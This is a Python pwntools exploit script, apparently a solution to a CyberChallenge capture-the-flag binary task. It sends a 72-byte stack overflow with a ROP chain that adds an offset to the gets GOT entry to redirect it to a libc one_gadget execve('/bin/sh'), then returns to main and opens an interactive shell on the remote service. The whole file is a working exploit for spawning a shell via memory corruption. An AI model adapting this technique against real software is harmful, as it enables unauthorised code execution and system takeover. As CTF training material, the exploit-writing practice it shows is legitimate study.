from pwn import *

context.terminal = ["konsole", "-e"]

breakpoint = "0x0000000000401191"
breakpoint1 = "0x0000000000401186"

r = remote("cyberchallenge.disi.unitn.it", 9203)
#r = remote("localhost", 5000)
# r = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# r = gdb.debug(
#     "./bin",
#     f"""
#     break *{breakpoint}
#     break *{breakpoint1}
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"},
# )

elf = ELF("./bin")
libc = ELF("./libc.so.6")

# 0xeb58e execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp


target = 0xeb58e
target_offset = target - libc.symbols["gets"]

gets_got = elf.got["gets"]
log.info(f"gets@got: {hex(gets_got)}")

main = elf.symbols["main"]
log.info(f"main: {hex(main)}")

# 0x000000000040119b: add dword ptr [rax], ebx; ret;
# 0x0000000000401196: pop rax; ret;
# 0x0000000000401198: pop rbx; ret;

add_rax_ebx = p64(0x000000000040119b)
pop_rax = p64(0x0000000000401196)
pop_rbx = p64(0x0000000000401198)

offset = 72

payload = b"A" * offset

payload += pop_rax
payload += p64(gets_got)
payload += pop_rbx
payload += p64(target_offset)
payload += add_rax_ebx

# set rbx = 0 (requirement for the one_gadget)
payload += pop_rbx
payload += p64(0)

# call the new main function
payload += p64(main)

r.sendline(payload)
r.interactive()
